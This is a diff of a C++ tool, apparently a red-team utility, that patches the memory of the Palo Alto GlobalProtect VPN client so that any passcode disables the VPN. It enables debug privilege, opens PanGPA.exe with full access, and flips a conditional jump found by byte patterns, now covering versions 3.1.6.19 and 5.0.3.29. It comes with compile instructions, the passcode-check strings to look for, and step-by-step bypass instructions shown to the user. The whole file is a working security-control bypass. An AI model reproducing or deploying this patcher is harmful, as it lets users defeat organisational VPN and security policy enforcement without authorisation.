@@ -5,11 +5,14 @@
  * It does this by patching process memory and thus allowing to 
  * disable VPN without entering proper password.
  * 
- * Tested on: 
- *	GlobalProtect client 3.1.6.19
- *	Palo Alto Networks 
+ * Tested on Palo Alto Networks: 
+ *  GlobalProtect client 3.1.6.19 (x64)
+ *  GlobalProtect client 5.0.3.29 (x64)
  *
- * Mariusz B. / mgeeky, '18
+ * Compilation:
+ *   C:> g++ GlobalProtectDisable.cpp -o GlobalProtectDisable.exe -static -static-libgcc -static-libstdc++
+ *
+ * Mariusz B. / mgeeky, '18-'20
 **/
 
 #include "windows.h"
@@ -19,9 +22,19 @@
 
 using namespace std;
 
-#define _DEBUG
-
 const wchar_t *processName = L"PanGPA.exe";
+const size_t PatternsNum = 2;
+const size_t SizeOfReplacingBytes = 2;
+
+const wchar_t *versionsArray[PatternsNum] = {
+    L"3.1.6.19",
+    L"5.0.3.29"
+};
+
+//
+// Patterns defined below must end up just before bytes intended to be replaced,
+// so just before JNE opcodes (75 XY)
+//
 
 /*
 00007FF621B7D02A | 85 C0                              | test    eax, eax                              |
@@ -30,49 +43,101 @@ const wchar_t *processName = L"PanGPA.exe";
 00007FF621B7D031 | E8 7A 00 00 00                     | call    pangpa.7FF621B7D0B0                   |
 00007FF621B7D036 | 85 C0                              | test    eax, eax                              |
 00007FF621B7D038 | 75 55                              | jne     pangpa.7FF621B7D08F 
-					^--- This is byte to be patched.
+                    ^--- This is byte to be patched. ----^
 */
-const BYTE patternToFind[] = {
-	0x85, 0xC0, 0x78, 0x61, 0x48, 0x8B, 0xCB, 0xE8, 
-	0x7A, 0x00, 0x00, 0x00, 0x85, 0xC0
+const BYTE patternToFind31619[] = {
+    0x85, 0xC0, 0x78, 0x61, 0x48, 0x8B, 0xCB, 0xE8, 
+    0x7A, 0x00, 0x00, 0x00, 0x85, 0xC0
 };
 
+/*
+.text:000000014005BFCC 48 83 C1 78                          add     rcx, 78h ; 'x'
+.text:000000014005BFD0 FF 15 BA B3 04 00                    call    cs:CRichEditView::XRichEditOleCallback::ContextSensitiveHelp(int)
+.text:000000014005BFD6 85 C0                                test    eax, eax
+.text:000000014005BFD8 75 49                                jnz     short loc_14005C023
+                        ^--- This is byte to be patched. ----^
+.text:000000014005BFDA 83 3D B3 94 0A 00 05                 cmp     cs:dword_140105494, 5
+
+Look for strings such as:
+    "CDisableDialog::CheckPasscode - passcode matched, ok to disable"
+    "CDisableDialog::CheckPasscode - passcode mismatch, deny disabling"
+*/
+
+const BYTE patternToFind50329[] = {
+    0x48, 0x83, 0xc1, 0x78, 0xff, 0x15, 0xba, 0xb3, 0x04, 0x00,
+    0x85, 0xc0
+};
+
+
+
 // jne     pangpa.7FF621B7D08F
-const BYTE bytesToBeReplaced[] = {
-	0x75, 0x55
+const BYTE bytesToBeReplaced31619[SizeOfReplacingBytes] = {
+    0x75, 0x55
 };
 
 // je      pangpa.7FF621B7D08F
-const BYTE replacingBytes[] = {
-	0x74, 0x55
+const BYTE replacingBytes31619[SizeOfReplacingBytes] = {
+    0x74, 0x55
 };
 
+// jnz     short loc_14005C023
+const BYTE bytesToBeReplaced50329[SizeOfReplacingBytes] = {
+    0x75, 0x49
+};
+
+// jz      short loc_14005C023
+const BYTE replacingBytes50329[SizeOfReplacingBytes] = {
+    0x74, 0x49
+};
+
+
+const BYTE *patternsArray[PatternsNum] = {
+    patternToFind31619,
+    patternToFind50329
+};
+
+const size_t patternsSizes[PatternsNum] = {
+    sizeof(patternToFind31619),
+    sizeof(patternToFind50329)
+};
+
+const BYTE *patternsToBeReplaced[PatternsNum] = {
+    bytesToBeReplaced31619,
+    bytesToBeReplaced50329
+};
+
+const BYTE *replacingBytes[PatternsNum] = {
+    replacingBytes31619,
+    replacingBytes50329
+};
+
+
 struct moduleInfo {
-	UINT64 baseAddr;
-	DWORD baseSize;
+    UINT64 baseAddr;
+    DWORD baseSize;
 };
 
 bool alreadyPatched = false;
 
 
 void dbg(const wchar_t * format, ...) {
-	wchar_t buffer[4096];
- 	va_list args;
-  	va_start (args, format);
-  	vswprintf (buffer,format, args);
+    wchar_t buffer[4096];
+    va_list args;
+    va_start (args, format);
+    vswprintf (buffer,format, args);
 
-  	wcout << L"[dbg] " << buffer << endl;
-  	va_end (args);
+    wcout << L"[dbg] " << buffer << endl;
+    va_end (args);
 }
 
 void msg(const wchar_t * format, ...) {
-	wchar_t buffer[4096];
- 	va_list args;
-  	va_start (args, format);
-  	vswprintf (buffer,format, args);
+    wchar_t buffer[4096];
+    va_list args;
+    va_start (args, format);
+    vswprintf (buffer,format, args);
 
-  	MessageBoxW(NULL, buffer, L"GlobalProtectDisable", 0);
-  	va_end (args);
+    MessageBoxW(NULL, buffer, L"GlobalProtectDisable", 0);
+    va_end (args);
 }
 
 BOOL setPrivilege(
@@ -121,31 +186,31 @@ BOOL setPrivilege(
 }
 
 DWORD findProcess(const wchar_t *procname) {
-	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if(hSnapshot) {
         PROCESSENTRY32W pe32;
         pe32.dwSize = sizeof(PROCESSENTRY32W);
 
         if(Process32FirstW(hSnapshot, &pe32)) {
             do {
-               	if (wcsicmp(procname, pe32.szExeFile) == 0) {
-               		return pe32.th32ProcessID;
-               	}
+                if (wcsicmp(procname, pe32.szExeFile) == 0) {
+                    return pe32.th32ProcessID;
+                }
             } while(Process32NextW(hSnapshot, &pe32));
          }
          CloseHandle(hSnapshot);
     }
 
-	return 0;
+    return 0;
 }
 
 BOOL getProcessModule(
-	const wchar_t * modName, 
-	DWORD pid, 
-	struct moduleInfo *out
+    const wchar_t * modName, 
+    DWORD pid, 
+    struct moduleInfo *out
 ) {
-	dbg(L"PID = %d", pid);
-	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
+    dbg(L"PID = %d", pid);
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
     
     if(hSnapshot != INVALID_HANDLE_VALUE) {
         MODULEENTRY32W me32;
@@ -153,144 +218,137 @@ BOOL getProcessModule(
 
         if(Module32FirstW(hSnapshot, &me32)) {
             do {
-            	dbg(L"Module name: %ls", me32.szModule);
+                dbg(L"Module name: %ls", me32.szModule);
 
-               	if (wcsicmp(modName, me32.szModule) == 0) {
-               		memset(out, 0, sizeof(struct moduleInfo));
+                if (wcsicmp(modName, me32.szModule) == 0) {
+                    memset(out, 0, sizeof(struct moduleInfo));
 
-               		out->baseAddr = (UINT64)me32.modBaseAddr;
-               		out->baseSize = me32.modBaseSize;
+                    out->baseAddr = (UINT64)me32.modBaseAddr;
+                    out->baseSize = me32.modBaseSize;
 
-               		return true;
-               	}
+                    return true;
+                }
             } while(Module32NextW(hSnapshot, &me32));
          }
          else {
-         	dbg(L"Module32FirstW failed.");
+            dbg(L"Module32FirstW failed.");
          }
 
          CloseHandle(hSnapshot);
     }
     else {
-    	dbg(L"CreateToolhelp32Snapshot failed.");
+        dbg(L"CreateToolhelp32Snapshot failed.");
     }
 
     return false;
 }
 
 BOOL patchProcessMemory(
-	const wchar_t * procName,
-	DWORD pid,
-	HANDLE hProcess,
-	const BYTE * patternToFind,
-	size_t patternToFindNum,
-	const BYTE * bytesToBeReplaced,
-	size_t bytesToBeReplacedNum,
-	const BYTE * replacingBytes,
-	size_t replacingBytesNum
+    struct moduleInfo &mod,
+    DWORD pid,
+    HANDLE hProcess,
+    const BYTE * patternToFind,
+    size_t patternToFindNum,
+    const BYTE * bytesToBeReplaced,
+    size_t bytesToBeReplacedNum,
+    const BYTE * replacingBytes,
+    size_t replacingBytesNum
 ) {
+    dbg(L"Module base: %llx, module size: %d", mod.baseAddr, mod.baseSize);
 
-	struct moduleInfo mod;
-	if (!getProcessModule(procName, pid, &mod)) {
-		dbg(L"Could not find process module. Error: %d", GetLastError());
-		return false;
-	}
+    BYTE page[4096];
 
-	dbg(L"Module base: %llx, module size: %d", mod.baseAddr, mod.baseSize);
+    SIZE_T fetched = 0;
+    UINT64 addr = mod.baseAddr;
 
-	BYTE page[4096];
+    while( fetched < mod.baseSize) {
+        memset(page, 0, sizeof(page));
 
-	SIZE_T fetched = 0;
-	UINT64 addr = mod.baseAddr;
+        SIZE_T out = 0;
 
-	while( fetched < mod.baseSize) {
-		memset(page, 0, sizeof(page));
+        if(ReadProcessMemory(
+            hProcess,
+            reinterpret_cast<LPCVOID>(addr),
+            page,
+            sizeof(page),
+            &out
+        )) {
 
-		SIZE_T out = 0;
+            UINT64 foundAddr = 0;
 
-		if(ReadProcessMemory(
-			hProcess,
-			reinterpret_cast<LPCVOID>(addr),
-			page,
-			sizeof(page),
-			&out
-		)) {
+            for(size_t m = 0; m < sizeof(page); m++) {
+                if (page[m] == patternToFind[0]) {
+                    bool found = true;
+                    for(size_t n = 0; n < patternToFindNum; n++) {
+                        if(page[m + n] != patternToFind[n]) {
+                            found = false;
+                            break;
+                        }
+                    }
 
-			UINT64 foundAddr = 0;
+                    if(found) {
+                        dbg(L"Found pattern at: %016llx: %x, %x, %x, %x, %x, %x, %x, %x, ...",
+                            addr + m,
+                            page[m + 0],
+                            page[m + 1],
+                            page[m + 2],
+                            page[m + 3],
+                            page[m + 4],
+                            page[m + 5],
+                            page[m + 6],
+                            page[m + 7]
+                        );
 
-			for(size_t m = 0; m < sizeof(page); m++) {
-				if (page[m] == patternToFind[0]) {
-					bool found = true;
-					for(size_t n = 0; n < patternToFindNum; n++) {
-						if(page[m + n] != patternToFind[n]) {
-							found = false;
-							break;
-						}
-					}
+                        for(size_t n = 0; n < bytesToBeReplacedNum; n++) {
+                            if(page[m + patternToFindNum + n] != bytesToBeReplaced[n]) {
+                                found = false;
 
-					if(found) {
-						dbg(L"Found pattern at: %016llx: %x, %x, %x, %x, %x, %x, %x, %x, ...",
-							addr + m,
-							page[m + 0],
-							page[m + 1],
-							page[m + 2],
-							page[m + 3],
-							page[m + 4],
-							page[m + 5],
-							page[m + 6],
-							page[m + 7]
-						);
+                                if ( page[m + patternToFindNum + n] == replacingBytes[n]) {
+                                    msg(L"Process is already patched.\nNo need to do it again.");
+                                    alreadyPatched = true;
+                                    return false;
+                                }
 
-						for(size_t n = 0; n < bytesToBeReplacedNum; n++) {
-							if(page[m + patternToFindNum + n] != bytesToBeReplaced[n]) {
-								found = false;
+                                dbg(L"Assuring pattern failed at byte %d: %x -> %x",
+                                    n, page[m + patternToFindNum + n], bytesToBeReplaced[n] );
+                                break;
+                            }
+                        }
 
-								if ( page[m + patternToFindNum + n] == replacingBytes[n]) {
-									msg(L"Process is already patched.\nNo need to do it again.");
-									alreadyPatched = true;
-									return false;
-								}
+                        if(found) {
+                            foundAddr = addr + m + patternToFindNum;
+                            dbg(L"Found pattern at: 0x%llx", foundAddr);
+                            break;
+                        }
+                    }
+                }
+            }
 
-								dbg(L"Assuring pattern failed at byte %d: %x -> %x",
-									n,page[m + patternToFindNum + n], bytesToBeReplaced[n] );
-								break;
-							}
-						}
+            if (foundAddr) {
+                dbg(L"Starting patching process from address: %016llx", foundAddr);
+                out = 0;
 
-						if(found) {
-							foundAddr = addr + m + patternToFindNum;
-							dbg(L"Found pattern at: 0x%llx", foundAddr);
-							break;
-						}
-					}
-				}
-			}
+                if(WriteProcessMemory(
+                    hProcess,
+                    reinterpret_cast<LPVOID>(foundAddr),
+                    replacingBytes,
+                    replacingBytesNum,
+                    &out
+                )) {
+                    dbg(L"Process has been patched, written: %d bytes.", out);
+                    return true;
+                }
 
-			if (foundAddr) {
-				dbg(L"Starting patching process from address: %016llx", foundAddr);
-				out = 0;
+                dbg(L"Process patching failed.");
+                return false;
+            }
 
-				if(WriteProcessMemory(
-					hProcess,
-					reinterpret_cast<LPVOID>(foundAddr),
-					replacingBytes,
-					replacingBytesNum,
-					&out
-				)) {
-					dbg(L"Process has been patched, written: %d bytes.", out);
-					return true;
-				}
+            fetched += out;
+            addr += out;
+        }
+    }
 
-				dbg(L"Process patching failed.");
-				return false;
-			}
-
-			fetched += out;
-			addr += out;
-		}
-	}
-
-	return false;
+    return false;
 }
 
 int CALLBACK WinMain(
@@ -300,56 +358,72 @@ int CALLBACK WinMain(
   int       nCmdShow
 ) {
 
-	HANDLE hToken = NULL;
+    HANDLE hToken = NULL;
 
-	if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)){
+    if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)){
         msg(L"OpenProcessToken() failed, error %u\n", GetLastError());
         return 0;
     }
 
-	if(!setPrivilege(hToken, SE_DEBUG_NAME, TRUE)) {
+    if(!setPrivilege(hToken, SE_DEBUG_NAME, TRUE)) {
         msg(L"Failed to enable privilege, error %u\n", GetLastError());
         return 0;
     }
 
-	DWORD pid = findProcess(processName);
-	if (!pid) {
-		msg(L"Could not find GlobalProtect process.");
-		return 0;
-	}
+    DWORD pid = findProcess(processName);
+    if (!pid) {
+        msg(L"Could not find GlobalProtect process.");
+        return 0;
+    }
 
-	dbg(L"Found PanGPA process: %d", pid);
-	
-	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-	if (!hProcess) {
-		msg(L"Could not open GlobalProtect process. Error: %d", GetLastError());
-		return 0;
-	}
+    dbg(L"Found PanGPA process: %d", pid);
+    
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProcess) {
+        msg(L"Could not open GlobalProtect process. Error: %d", GetLastError());
+        return 0;
+    }
 
-	dbg(L"Opened process handle.");
+    dbg(L"Opened process handle.");
 
-	BOOL ret = patchProcessMemory(
-		processName,
-		pid,
-		hProcess,
-		patternToFind,
-		sizeof(patternToFind),
-		bytesToBeReplaced,
-		sizeof(bytesToBeReplaced),
-		replacingBytes,
-		sizeof(replacingBytes)
-	);
+    BOOL ret;
 
-	if(!ret) {
-		if(!alreadyPatched) {
-			msg(L"Could not patch the process. Error: %d", GetLastError());
-		}
-	}
-	else {
-		msg(L"Successfully patched the process! :-)\nNow, in order to bypass GlobalProtect - do the following:\n\t1. Right click on GlobalProtect Tray-icon\n\t2. Select 'Disable'\n\t3. In 'Passcode' input field enter whatever you like.\n\t4. Press OK.\n\nThe GlobalProtect should disable itself cleanly.\n\nHave fun!");
-	}
+    struct moduleInfo mod = {0};
+    if (!getProcessModule(processName, pid, &mod)) {
+        dbg(L"Could not find process module. Error: %d", GetLastError());
+        return false;
+    }
 
-	dbg(L"Closing process handle.");
-	CloseHandle(hProcess);
-	return 0;
+    size_t i = 0;
+    for(i = 0; i < PatternsNum; i++)
+    {
+        dbg(L"Trying to match pattern for version: %ls", versionsArray[i]);
+
+        ret = patchProcessMemory(
+            mod,
+            pid,
+            hProcess,
+            patternsArray[i],
+            patternsSizes[i],
+            patternsToBeReplaced[i],
+            SizeOfReplacingBytes,
+            replacingBytes[i],
+            SizeOfReplacingBytes
+        );
+
+        if(ret) break;
+    }
+
+    if(!ret) {
+        if(!alreadyPatched) {
+            msg(L"Could not patch the process. Error: %d", GetLastError());
+        }
+    }
+    else {
+        msg(L"Successfully patched the process (version: %ls)! :-)\nNow, in order to bypass GlobalProtect - do the following:\n\t1. Right click on GlobalProtect Tray-icon\n\t2. Select 'Disable'\n\t3. In 'Passcode' input field enter whatever you like.\n\t4. Press OK.\n\nThe GlobalProtect should disable itself cleanly.\n\nHave fun!", versionsArray[i]);
+    }
+
+    dbg(L"Closing process handle.");
+    CloseHandle(hProcess);
+    return 0;
 }
